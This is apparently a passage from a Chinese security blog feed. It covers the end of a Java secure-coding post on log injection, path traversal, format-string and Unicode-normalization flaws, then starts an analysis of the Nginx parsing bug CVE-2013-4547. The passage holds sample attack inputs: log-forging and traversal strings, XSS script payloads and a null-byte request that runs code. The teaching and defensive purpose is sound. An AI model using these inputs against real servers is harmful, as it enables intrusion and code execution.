class="line">User Login Successed for: budi</span><br><span class="line">恶意用户登录失败，记录日志.....</span><br><span class="line">User Login Failed for: budi </span><br><span class="line">User Login Successed for: administrator</span><br></pre></td></tr></table></figure><p>（2）合规代码（安全检查）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginFormat</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeLog</span><span class="params">( <span class="type">boolean</span> isLogin,String username)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!Pattern.matches(<span class="string">&quot;[A-Za-z0-9_]+&quot;</span>, username))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;User Login Failed for Unknow User&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>   <span class="keyword">if</span>(isLogin)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;User Login Successed for: &quot;</span>+username);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;User Login Failed for: &quot;</span>+username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        String test1= <span class="string">&quot;budi&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;正常用户登录成功后，记录日志.....&quot;</span>);</span><br><span class="line">        writeLog(<span class="literal">true</span>, test1);</span><br><span class="line">        <span class="type">String</span> <span class="variable">test2</span> <span class="operator">=</span> <span class="string">&quot;budi \nUser Login Successed for: administrator&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;恶意用户登录失败，记录日志.....&quot;</span>);</span><br><span class="line">        writeLog(<span class="literal">false</span>, test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正常用户登录成功后，记录日志.....</span><br><span class="line">User Login Successed for: budi</span><br><span class="line">恶意用户登录失败，记录日志.....</span><br><span class="line">User Login Failed for Unknow User</span><br></pre></td></tr></table></figure><h2 id="3、防范建议：-6"><a href="#3、防范建议：-6" class="headerlink" title="3、防范建议："></a>3、防范建议：</h2><p>√ 先检测用户输入，强烈建议直接拒绝带非法字符的数据</p><h1 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h1><hr><h2 id="1、原理：-4"><a href="#1、原理：-4" class="headerlink" title="　1、原理："></a>　1、原理：</h2><p>（1）正常输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john.txt</span><br></pre></td></tr></table></figure><p>（2）恶意输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../a.txt&quot;</span><br></pre></td></tr></table></figure><h2 id="2、Java代码分析-6"><a href="#2、Java代码分析-6" class="headerlink" title="2、Java代码分析"></a>2、Java代码分析</h2><p>（1）非合规代码（未安全检查）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PathFault</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;合法输入.......&quot;</span>);</span><br><span class="line">        readFile(<span class="string">&quot;john.txt&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;\n恶意输入.......&quot;</span>);</span><br><span class="line">        readFile(<span class="string">&quot;../../a.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">readFile</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;F://passwords//&quot;</span>+path);</span><br><span class="line">        <span class="type">String</span> <span class="variable">absPath</span> <span class="operator">=</span> f.getAbsolutePath();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f);</span><br><span class="line">        System.out.print(<span class="string">&quot;绝对路径：&quot;</span>+absPath);</span><br><span class="line">        <span class="keyword">if</span>(!isInSecureDir(Paths.get(absPath)))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;-&gt;非安全路径&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;-&gt;安全路径&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isInSecureDir</span><span class="params">(Path path)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!path.startsWith(<span class="string">&quot;F://passwords//&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">合法输入.......</span><br><span class="line">绝对路径：F:\passwords\john.txt-&gt;安全路径</span><br><span class="line">恶意输入.......</span><br><span class="line">绝对路径：F:\passwords\..\..\a.txt-&gt;安全路径</span><br></pre></td></tr></table></figure><p>（2）合规代码（先统一路径表示）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class PathFormat &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException&#123;</span><br><span class="line">        System.out.println(&quot;合法输入.......&quot;);</span><br><span class="line">        readFile(&quot;john.txt&quot;);</span><br><span class="line">        System.out.println(&quot;/n恶意输入.......&quot;);</span><br><span class="line">        readFile(&quot;../../a.txt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    private static void readFile(String path) throws IOException&#123;</span><br><span class="line">        File f = new File(&quot;F://passwords//&quot;+path);</span><br><span class="line">        String canonicalPath = f.getCanonicalPath();</span><br><span class="line">        System.out.println(&quot;绝对路径&quot;+canonicalPath);</span><br><span class="line">        FileInputStream fls = new FileInputStream(f);</span><br><span class="line">        if(!isInSecureDir(Paths.get(canonicalPath)))&#123;</span><br><span class="line">            System.out.print(&quot;非安全路径&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(&quot;安全路径&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    private static boolean isInSecureDir(Path path)&#123;</span><br><span class="line">        if(!path.startsWith(&quot;F://passwords//&quot;))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">合法输入.......</span><br><span class="line">绝对路径F:\passwords\john.txt-&gt;安全路径</span><br><span class="line">恶意输入.......</span><br><span class="line">绝对路径F:\a.txt-&gt;非安全路径</span><br></pre></td></tr></table></figure><h2 id="3、防范建议"><a href="#3、防范建议" class="headerlink" title="3、防范建议"></a>3、防范建议</h2><ul><li>严格的权限限制-&gt;安全管理器</li><li>getCanonicalPath()在所有平台上对所有别名、快捷方式、符号链接采用统一的解析。</li></ul><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><hr><h2 id="1、原理：-5"><a href="#1、原理：-5" class="headerlink" title="1、原理："></a>1、原理：</h2><p>（1）正常输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11</span><br></pre></td></tr></table></figure><p>正常拼接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(&quot;11 did not match! HINT: It was issued on %1$te rd of some month\n&quot;, c);</span><br></pre></td></tr></table></figure><p>（2）恶意输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">1<span class="variable">$tm</span>或%1<span class="variable">$te</span>或%1<span class="variable">$tY</span></span></span><br></pre></td></tr></table></figure><p>恶意拼接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(&quot;%1$tm did not match! HINT: It was issued on %1$te rd of some month\n&quot;, c);</span><br></pre></td></tr></table></figure><h2 id="2、Java代码分析-7"><a href="#2、Java代码分析-7" class="headerlink" title="2、Java代码分析"></a>2、Java代码分析</h2><p>（1）非合规代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateFault</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">Calendar</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GregorianCalendar</span>(<span class="number">2016</span>, GregorianCalendar.MAY, <span class="number">23</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//正常用户输入</span></span><br><span class="line">        System.out.println(<span class="string">&quot;正常用户输入.....&quot;</span>);</span><br><span class="line">        format(<span class="string">&quot;11&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;非正常输入获取月份.....&quot;</span>);</span><br><span class="line">        format(<span class="string">&quot;%1$tm&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;非正常输入获取日.....&quot;</span>);</span><br><span class="line">        format(<span class="string">&quot;%1$te&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;非正常输入获取年份.....&quot;</span>);</span><br><span class="line">        format(<span class="string">&quot;%1$tY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(String month)</span>&#123;</span><br><span class="line">        System.out.printf(month+<span class="string">&quot; did not match! HINT: It was issued on %1$te rd of some month\n&quot;</span>, c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">11 did not match! HINT: It was issued on 23rd of some month</span><br><span class="line">非正常输入获取月份.....</span><br><span class="line">05 did not match! HINT: It was issued on 23rd of some month</span><br><span class="line">非正常输入获取日.....</span><br><span class="line">23 did not match! HINT: It was issued on 23rd of some month</span><br><span class="line">非正常输入获取年份.....</span><br><span class="line">2016 did not match! HINT: It was issued on 23rd of some month</span><br></pre></td></tr></table></figure><p>（2）合规代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateFormat</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">Calendar</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GregorianCalendar</span>(<span class="number">2016</span>, GregorianCalendar.MAY, <span class="number">23</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//正常用户输入</span></span><br><span class="line">        System.out.println(<span class="string">&quot;正常用户输入.....&quot;</span>);</span><br><span class="line">        format(<span class="string">&quot;11&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;非正常输入获取月份.....&quot;</span>);</span><br><span class="line">        format(<span class="string">&quot;%1$tm&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;非正常输入获取日.....&quot;</span>);</span><br><span class="line">        format(<span class="string">&quot;%1$te&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;非正常输入获取年份.....&quot;</span>);</span><br><span class="line">        format(<span class="string">&quot;%1$tY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(String month)</span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;%s did not match! HINT: It was issued on %1$te rd of some month\n&quot;</span>, month, c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常用户输入.....</span><br><span class="line">11 did not match! HINT: It was issued on </span><br><span class="line">                      Exception in thread &quot;main&quot; java.util.IllegalFormatConversionException: e != java.lang.String</span><br></pre></td></tr></table></figure><h2 id="3、防范建议：-7"><a href="#3、防范建议：-7" class="headerlink" title="3、防范建议："></a>3、防范建议：</h2><ul><li>对用户输入进行安全检查</li><li>在格式字符串中，杜绝使用用户输入参数</li></ul><h1 id="字符串标准化"><a href="#字符串标准化" class="headerlink" title="字符串标准化"></a>字符串标准化</h1><hr><h2 id="1、原理：-6"><a href="#1、原理：-6" class="headerlink" title="1、原理："></a>1、原理：</h2><p>（1）合法输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=budi</span><br></pre></td></tr></table></figure><p>（2）恶意输入一：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">username=/\uFE65\uFE64script\uFE65alert(1) \uFE64/script\uFE65</span><br></pre></td></tr></table></figure><p>（3）恶意输入二：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=A\uD8AB</span><br><span class="line">username=A?</span><br></pre></td></tr></table></figure><h2 id="2、Java代码分析-8"><a href="#2、Java代码分析-8" class="headerlink" title="2、Java代码分析"></a>2、Java代码分析</h2><p>（1）非合规代码（先检查再统一编码）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncodeFault</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;未编码的非法字符&quot;</span>);</span><br><span class="line">        check(<span class="string">&quot;/&gt;&lt;script&gt;alert(2)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Unicode编码的非法字符&quot;</span>);</span><br><span class="line">        check(<span class="string">&quot;/\uFE65\uFE64script\uFE65alert(1) \uFE64/script\uFE65&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">check</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;[&lt;&gt;]&quot;</span>);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(s);</span><br><span class="line">        <span class="keyword">if</span> (matcher.find())&#123;</span><br><span class="line">            System.out.println(s+<span class="string">&quot;-&gt;存在非法字符&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(s+<span class="string">&quot;-&gt;合法字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s = Normalizer.normalize(s, Form.NFC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">未编码的非法字符</span><br><span class="line"><span class="meta prompt_">/&gt;</span><span class="language-bash">&lt;script&gt;alert(2)&lt;/script&gt;-&gt;存在非法字符</span></span><br><span class="line">Unicode编码的非法字符</span><br><span class="line">/﹥﹤script﹥alert(1) ﹤/script﹥-&gt;合法字符</span><br></pre></td></tr></table></figure><p>（3）合规代码（先统一编码再检查）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncodeFormat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;未编码的非法字符&quot;</span>);</span><br><span class="line">        check(<span class="string">&quot;/&gt;&lt;script&gt;alert(2)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Unicode编码的非法字符&quot;</span>);</span><br><span class="line">        check(<span class="string">&quot;/\uFE65\uFE64script\uFE65alert(1)\uFE64/script\uFE65&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">check</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        s = Normalizer.normalize(s, Form.NFC);</span><br><span class="line">        <span class="comment">// 用\uFFFD替代非Unicode编码字符</span></span><br><span class="line">        s = s.replaceAll(<span class="string">&quot;^\\p&#123;ASCII&#125;]&quot;</span>, <span class="string">&quot;\uFFFD&quot;</span>);</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;[&lt;&gt;]&quot;</span>);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(s);</span><br><span class="line">        <span class="keyword">if</span> (matcher.find())&#123;</span><br><span class="line">            System.out.println(s+<span class="string">&quot;-&gt;存在非法字符&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(s+<span class="string">&quot;-&gt;合法字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">未编码的非法字符</span><br><span class="line"><span class="meta prompt_">/&gt;</span><span class="language-bash">&lt;script&gt;alert(2)&lt;/script&gt;-&gt;存在非法字符</span></span><br><span class="line">Unicode编码的非法字符</span><br><span class="line"><span class="meta prompt_">/&gt;</span><span class="language-bash">&lt;script&gt;alert(1)&lt;/script&gt;-&gt;存在非法字符</span></span><br></pre></td></tr></table></figure><h2 id="3、防范建议：-8"><a href="#3、防范建议：-8" class="headerlink" title="3、防范建议："></a>3、防范建议：</h2><ul><li>先按指定编码方式标准化字符串，再检查非法输入</li><li>检测非法字符</li></ul><h1 id="0x0B-最后总结"><a href="#0x0B-最后总结" class="headerlink" title="0x0B 最后总结"></a>0x0B 最后总结</h1><hr><ul><li>从安全角度看，移动应用与传统Web应用没有本质区别。</li><li>安全的Web应用必须处理好两件事：<ol><li>处理好用户的输入（HTTP请求）</li><li>处理好应用的输出（HTTP响应）</li></ol></li></ul><p>参考文献: 《Java安全编码标准》</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> Java </tag>
            
            <tag> 二进制安全 </tag>
            
            <tag> IO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx解析漏洞深入利用及分析</title>
      <link href="/2023/01/23/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E5%8F%8A%E5%88%86%E6%9E%90/"/>
      <url>/2023/01/23/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E5%8F%8A%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>Nginx历史上曾出现过多次解析漏洞，比如80sec发现的解析漏洞，以及后缀名后直接添加%00截断导致代码执行的解析漏洞。</p><p>但是在2013年底，nginx再次爆出漏洞（CVE-2013-4547），此漏洞可导致目录跨越及代码执行，其影响版本为：nginx 0.8.41 – 1.5.6，范围较广。</p><h1 id="0x01-漏洞朔源"><a href="#0x01-漏洞朔源" class="headerlink" title="0x01 漏洞朔源"></a>0x01 漏洞朔源</h1><p>1.从官方补丁可以看出nginx在ngx_http_parse_request_line函数处做了代码patch，下载nginx源代码，定位其补丁文件为ngx_http_parse.c，函数ngx_http_parse_request_line中，分别位于代码段：</p><p>由此可定位本次漏洞需要分析的点，启用gdb调试，将break点设置为ngx_http_parse_request_line，</p><p>并且watch变量state和p，因为此函数为状态机，state为状态值，p为指针所指文志，这将是漏洞触发的关键点。</p><p>调试过程中需要跟踪nginx的worker子进程，所以需要设置setfollow-fork-mode child，并且在相应的地方设置断点，</p><p><img src="https://image-1313245095.cos.ap-beijing.myqcloud.com/2023/01/23/16744869614887.jpg" alt=""><br>图-1 跟进子进程</p><p>2.分别发送正常和攻击语句进行测试：<br>正常语句：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/a.jpg</span><br></pre></td></tr></table></figure><br>攻击语句：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/a.jpg（非编码空格）\0.php</span><br></pre></td></tr></table></figure></p><p>使用正常语句一直s或n跟踪，会发现在对url的解析过程中，当路径中存在’.’或url存在’\0’会有如下处理：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line"><span class="keyword">case</span> sw_check_uri:      </span><br><span class="line">   ……</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>: </span><br><span class="line">           r-&gt;complex_uri = <span class="number">1</span>;  <span class="comment">//此作为flag会判断使用ngx_http_parse_complex_uri方法，对路径修复</span></span><br><span class="line">           state = sw_uri; </span><br><span class="line">           <span class="keyword">break</span>;    </span><br><span class="line">casesw_check_uri:    </span><br><span class="line">   ……</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:   <span class="comment">//当遇到\0是，将会判断为非法字符</span></span><br><span class="line">           <span class="keyword">return</span> NGX_HTTP_PARSE_INVALID_REQUEST;   </span><br></pre></td></tr></table></figure></p><p>但是在检查uri中有空格则会进入到sw_check_uri_http_09的逻辑中，那么当我们发送攻击代码的时候，执行流程将如下：<br><img src="https://image-1313245095.cos.ap-beijing.myqcloud.com/2023/01/23/16744870687358.jpg" alt=""><br>图-2 \0未触发异常</p><p>再回到sw_check_uri状态，此时后面的字符串为.php，而“.”将被为是uri的扩展名的分隔符<br><img src="https://image-1313245095.cos.ap-beijing.myqcloud.com/2023/01/23/16744870895951.jpg" alt=""><br>图-3 取后缀名错误</p><p>最终导致nginx认为此次请求的后缀名为php，通过配置，会传给fastcgi进行处理，而fastcgi在查找文件的时候被\0截断，最终取到”a.jpg(非编码空格)”文件（注：Linux下php-fpm默认限制的后缀名为php，如未取消限制，访问将出现access denied。测试想要查看执行结果，需修改php-fpm.conf中的security.limit_extensions为空，即允许任意后缀名文件作为php解析。）</p><p>跨越<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location /protected / &#123;deny all;&#125;</span><br></pre></td></tr></table></figure></p><p>的规则的原理与此类似，均为状态机中判断出现混乱，从导致而可以跨越到protected目录中，访问默认不可访问到的文件。</p><p>由此可知，常规利用中如果想触发代码执行，条件为可上传带空格的文件到服务器，并且服务器存储的时候也需要保留空格，而大多数情况下，web应用在处理上传文件时，都会将文件重命名，通过应用自身添加后缀，或者对后缀名去掉特殊字符后，做类型判断。</p><p>以上因素都导致此漏洞被认为是鸡肋漏洞，难以利用，而被人们所忽略。</p><h1 id="0x02-windows下的RCE"><a href="#0x02-windows下的RCE" class="headerlink" title="0x02 windows下的RCE"></a>0x02 windows下的RCE</h1><p>此问题在windows的攻击场景中，则从小汽车变身为变形金刚。</p><p>首先，我们了解一下windows读取文件时的特点，即文件系统api创建文件名或查找文件名时，默认会去掉文件名后的空格，再执行操作，参见示例代码，目录下放置a.txt不带空格:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 